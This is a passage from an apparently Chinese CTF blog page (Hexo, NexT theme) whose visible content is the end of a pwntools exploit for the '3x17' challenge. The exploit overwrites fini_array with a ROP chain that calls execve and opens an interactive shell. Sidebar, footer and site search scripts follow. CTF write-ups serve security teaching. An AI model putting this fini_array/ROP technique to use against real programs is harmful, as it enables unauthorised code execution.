class="number">0x30</span>,p64(pop_rdx) + p64(<span class="number">0</span>))</span><br><span class="line">write(fini_array + <span class="number">0x40</span>,p64(pop_rax) + p64(<span class="number">0x3b</span>))</span><br><span class="line">write(fini_array + <span class="number">0x50</span>,p64(syscall))</span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x401c4b")</span></span><br><span class="line">write(fini_array,p64(leave_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>参考博客：<a href="https://ama2in9.top/2019/04/10/3x17/" target="_blank" rel="noopener">https://ama2in9.top/2019/04/10/3x17/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/24/桂电2019re/" rel="next" title="桂电2019 re write up">
+                <i class="fa fa-chevron-left"></i> 桂电2019 re write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/n0va.jpg" alt="n0va">
+            
+              <p class="site-author-name" itemprop="name">n0va</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#calc"><span class="nav-number">1.</span> <span class="nav-text">calc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">1.1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#主函数calc"><span class="nav-number">1.1.1.</span> <span class="nav-text">主函数calc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析parse-expr函数"><span class="nav-number">1.1.2.</span> <span class="nav-text">分析parse_expr函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval函数"><span class="nav-number">1.1.3.</span> <span class="nav-text">eval函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3x17"><span class="nav-number">2.</span> <span class="nav-text">3x17</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析-1"><span class="nav-number">2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">n0va</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
